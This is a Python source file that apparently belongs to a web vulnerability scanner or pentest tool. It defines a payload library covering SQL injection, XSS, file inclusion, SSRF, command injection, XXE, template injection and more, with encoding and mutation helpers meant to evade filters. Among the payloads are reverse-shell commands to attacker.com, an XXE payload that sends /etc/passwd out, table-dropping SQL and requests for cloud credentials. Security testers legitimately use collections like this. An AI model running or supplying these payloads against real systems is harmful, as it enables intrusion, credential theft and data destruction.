"""Advanced Payload Database with Evasion Techniques"""
from typing import Dict, List, Tuple
import base64
import urllib.parse


class AdvancedPayloads:
    """Comprehensive payload library with modern evasion techniques"""
    
    @staticmethod
    def sqli_advanced() -> List[str]:
        """Advanced SQL injection payloads with bypass techniques"""
        return [
            # Auth bypass
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "admin'--", "admin' #",
            "') OR ('1'='1", "1' OR '1'='1", "1' OR 1=1--", "1' OR 1=1#",
            
            # Union-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password FROM users--",
            "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--",
            
            # Blind SQLi
            "1' AND 1=1--", "1' AND 1=2--",
            "1' AND SUBSTRING(@@version,1,1)='5'--",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
            
            # Time-based
            "1'; WAITFOR DELAY '0:0:5'--", "1'; SELECT SLEEP(5)--",
            "1'; pg_sleep(5)--", "1' AND BENCHMARK(5000000,SHA1('test'))--",
            "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
            
            # Error-based
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "1' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            
            # Stacked queries
            "1'; DROP TABLE users--", "1'; INSERT INTO users VALUES('hacked')--",
            "1'; CREATE TABLE backdoor(cmd TEXT)--",
            
            # Filter bypass
            "' oR '1'='1", "' Or/**/'1'='1", "'%20OR%20'1'='1",
            "' /*!OR*/ '1'='1", "'%00OR'1'='1", "'/**/OR/**/'1'='1",
            "'/**/UNION/**/SELECT/**/NULL--", "'/**/UNION/**/ALL/**/SELECT/**/NULL--",
            
            # MySQL specific
            "1' AND BENCHMARK(10000000,SHA1('test'))--",
            "1' AND SLEEP(5)--", "1' AND WAITFOR DELAY '0:0:5'--",
            
            # PostgreSQL specific
            "1' AND 1=CAST((SELECT version()) AS INTEGER)--",
            "1' AND 1=CAST((SELECT current_database()) AS INTEGER)--",
            
            # MSSQL specific
            "1'; EXEC xp_cmdshell('whoami')--",
            "1'; EXEC sp_executesql N'SELECT * FROM users'--",
        ]
    
    @staticmethod
    def xss_advanced() -> List[str]:
        """Advanced XSS payloads with bypass techniques"""
        return [
            # Basic
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "<body onload=alert(1)>",
            
            # Filter bypass
            "<ScRiPt>alert(1)</sCrIpT>", "<SCRIPT>alert(1)</SCRIPT>",
            "<img/src=x/onerror=alert(1)>", "<svg\\x0aonload=alert(1)>",
            "<img src=x onerror=alert(1)//",
            
            # Encoding
            "<script>alert\\x281\\x29</script>",
            "<img src=x onerror=\"\\u0061lert(1)\">",
            "<svg onload=\"alert&#40;1&#41;\">",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            
            # No parentheses
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)//",
            "<script>top['al'+'ert'](1)</script>",
            "<script>self['al'+'ert'](1)</script>",
            
            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onfocus=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            
            # Protocol handlers
            "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            
            # Template injection
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}", "#{alert(1)}",
            "{{7*7}}", "${7*7}", "#{7*7}",
            
            # DOM-based
            "<script>document.write(atob('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))</script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            
            # CSP bypass
            "<script src='data:text/javascript,alert(1)'></script>",
            "<script src='https://cdn.example.com/external.js'></script>",
        ]
    
    @staticmethod
    def lfi_payloads() -> List[str]:
        """Local File Inclusion payloads with bypass techniques"""
        return [
            # Linux
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd", "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            
            # Windows
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            
            # Log poisoning
            "/var/log/apache2/access.log", "/var/log/nginx/access.log",
            "/var/log/auth.log", "/proc/self/environ",
            "/proc/self/cmdline", "/proc/self/fd/0",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input", "expect://id",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            
            # Null byte
            "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
            
            # Double encoding
            "..%252f..%252f..%252fetc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
            
            # Unicode
            "..%u2215..%u2215..%u2215etc/passwd",
            
            # Absolute paths
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
    
    @staticmethod
    def ssrf_payloads() -> List[str]:
        """SSRF payloads for internal service access"""
        return [
            # Localhost variants
            "http://127.0.0.1", "http://localhost", "http://[::1]",
            "http://0x7f000001", "http://2130706433", "http://0177.0.0.1",
            "http://127.0.0.1:22", "http://127.0.0.1:80", "http://127.0.0.1:443",
            "http://127.0.0.1:3306", "http://127.0.0.1:6379", "http://127.0.0.1:11211",
            
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            
            # Internal services
            "http://127.0.0.1:22", "http://127.0.0.1:3306",
            "http://127.0.0.1:6379", "http://127.0.0.1:11211",
            "http://127.0.0.1:8080", "http://127.0.0.1:8443",
            
            # Protocol handlers
            "file:///etc/passwd", "file:///etc/shadow",
            "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:70",
            "ldap://localhost:389/", "tftp://127.0.0.1:69/test.txt",
            
            # URL encoding bypass
            "http://127.0.0.1%00.example.com",
            "http://127.0.0.1%0d%0a%0d%0a",
            "http://127.0.0.1:80%23@evil.com",
        ]
    
    @staticmethod
    def cmd_injection() -> List[str]:
        """Command injection payloads with bypass techniques"""
        return [
            # Unix
            "; id", "| id", "&& id", "$(id)", "`id`",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; whoami", "$(whoami)", "`whoami`",
            "; ls -la", "| ls -la", "&& ls -la",
            
            # Blind
            "; sleep 5", "| sleep 5", "$(sleep 5)",
            "; ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
            
            # Reverse shell
            "; nc -e /bin/sh attacker.com 4444",
            "| nc -e /bin/sh attacker.com 4444",
            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "; /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",
            
            # Windows
            "| whoami", "& whoami", "^& whoami",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| dir C:\\", "& dir C:\\",
            "| net user", "& net user",
            
            # Bypass
            ";{ id; }", "| { id; }", "|| id ||",
            "; id #", "| id #",
        ]
    
    @staticmethod
    def xxe_payloads() -> List[str]:
        """XXE payloads for XML injection"""
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>\">%eval;%exfil;]><data></data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        ]
    
    @staticmethod
    def ssti_payloads() -> List[str]:
        """Server-Side Template Injection payloads"""
        return [
            "{{7*7}}", "${7*7}", "#{7*7}",
            "{{config}}", "{{self}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__base__.__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "${{getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('id')}}",
            "{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0]}}",
            "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ]
    
    @staticmethod
    def redirect_payloads() -> List[str]:
        """Open redirect payloads"""
        return [
            "//attacker.com", "https:attacker.com", "https:///attacker.com",
            "///attacker.com", "////attacker.com", "/\\attacker.com",
            "\\/attacker.com", "//attacker.com/path", "http://attacker.com",
            "https://attacker.com", "//attacker%E3%80%82com",
            "///attacker.com/path", "////attacker.com@trusted.com",
            "https:attacker.com", "//attacker.com%2F%2E%2E",
            " javascript:alert(1)", "javascript:alert(1)", "JaVaScRiPt:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]
    
    @staticmethod
    def ldap_payloads() -> List[str]:
        """LDAP injection payloads"""
        return [
            "*", "*)(&", "*)(uid=*))(|(uid=*",
            "admin)(&)", "admin)(|(password=*))",
            "admin)(cn=*))(|(cn=*", "*)(objectClass=*)",
            "admin)(&)(password=*))", "admin)(cn=*))%00",
        ]
    
    @staticmethod
    def deserialization_payloads() -> List[str]:
        """Deserialization attack payloads"""
        return [
            'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAADAAN3cIAAAAQAAAAAB4',
            '{"__class__":"subprocess.Popen","args":["id"]}',
            '{}.__class__.__init__.__globals__',
            '{{config.__class__.__init__.__globals__}}',
        ]
    
    @staticmethod
    def path_traversal() -> List[str]:
        """Path traversal payloads"""
        return [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd", "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd%00", "/etc/passwd%00.jpg",
            "..%00/..%00/..%00/etc/passwd",
        ]
    
    @staticmethod
    def header_injection() -> List[str]:
        """HTTP header injection payloads"""
        return [
            "\r\nX-Injected: header",
            "\r\nSet-Cookie: session=hacked",
            "\r\nLocation: http://attacker.com",
            "\r\nContent-Security-Policy: default-src 'none'",
            "\r\n\r\n<html><body>Injected</body></html>",
        ]
    
    @staticmethod
    def http_smuggling() -> List[str]:
        """HTTP request smuggling payloads"""
        return [
            "POST / HTTP/1.1\r\nContent-Length: 6\r\nContent-Length: 0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 3\r\n\r\nGET / HTTP/1.1\r\n\r\n",
            "Transfer-Encoding: chunked\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 3\r\n\r\nGET / HTTP/1.1\r\n\r\n",
        ]
    
    @staticmethod
    def jwt_payloads() -> List[str]:
        """JWT attack payloads"""
        return [
            '{"alg":"none"}',
            '{"alg":"HS256","typ":"JWT"}',
            '{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}',
            '{"alg":"HS256","typ":"JWT","jku":"http://attacker.com/jwks.json"}',
            '{"alg":"HS256","typ":"JWT","x5u":"http://attacker.com/cert.pem"}',
        ]
    
    @staticmethod
    def graphql_payloads() -> List[str]:
        """GraphQL injection payloads"""
        return [
            '{"query":"{__schema{types{name}}}"}',
            '{"query":"{__typename}"}',
            '{"query":"{users{id,name,email}}"}',
            '{"query":"{user(id:1){id,name,email}}"}',
            '{"query":"{__schema{queryType{fields{name}}}}"}',
        ]
    
    @staticmethod
    def cloud_metadata() -> List[str]:
        """Cloud metadata access payloads"""
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/user-data/",
        ]
    
    @staticmethod
    def get_all_categories() -> Dict[str, List[str]]:
        """Get all payload categories"""
        return {
            'sqli': AdvancedPayloads.sqli_advanced(),
            'xss': AdvancedPayloads.xss_advanced(),
            'lfi': AdvancedPayloads.lfi_payloads(),
            'ssrf': AdvancedPayloads.ssrf_payloads(),
            'cmdi': AdvancedPayloads.cmd_injection(),
            'xxe': AdvancedPayloads.xxe_payloads(),
            'ssti': AdvancedPayloads.ssti_payloads(),
            'redirect': AdvancedPayloads.redirect_payloads(),
            'ldap': AdvancedPayloads.ldap_payloads(),
            'deserialization': AdvancedPayloads.deserialization_payloads(),
            'path_traversal': AdvancedPayloads.path_traversal(),
            'header_injection': AdvancedPayloads.header_injection(),
            'http_smuggling': AdvancedPayloads.http_smuggling(),
            'jwt': AdvancedPayloads.jwt_payloads(),
            'graphql': AdvancedPayloads.graphql_payloads(),
            'cloud_metadata': AdvancedPayloads.cloud_metadata()
        }
    
    @staticmethod
    def encode_payload(payload: str, encoding: str) -> str:
        """Encode payload using various techniques"""
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return payload.encode().hex()
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        return payload
    
    @staticmethod
    def mutate_payload(payload: str) -> List[str]:
        """Generate mutations of a payload"""
        mutations = [payload]
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(payload.swapcase())
        mutations.append(''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
        mutations.append(payload.replace(' ', '%20'))
        mutations.append(payload.replace(' ', '+'))
        mutations.append(payload.replace(' ', '\t'))
        mutations.append(payload.replace(' ', '/**/'))
        mutations.append(payload.replace("'", "\\'"))
        mutations.append(payload.replace('"', '\\"'))
        mutations.append(AdvancedPayloads.encode_payload(payload, 'url'))
        mutations.append(AdvancedPayloads.encode_payload(payload, 'base64'))
        return mutations
